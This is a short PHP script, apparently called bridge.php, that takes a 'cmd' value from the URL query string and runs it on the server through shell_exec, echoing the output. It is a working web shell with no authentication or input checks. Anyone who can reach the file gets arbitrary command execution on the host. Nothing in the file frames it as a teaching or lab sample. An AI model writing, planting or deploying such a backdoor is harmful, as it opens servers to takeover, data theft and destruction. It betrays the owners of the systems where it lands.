<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo "Running: $cmd\n";
    echo shell_exec($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Usage: bridge.php?cmd=your_command";
}
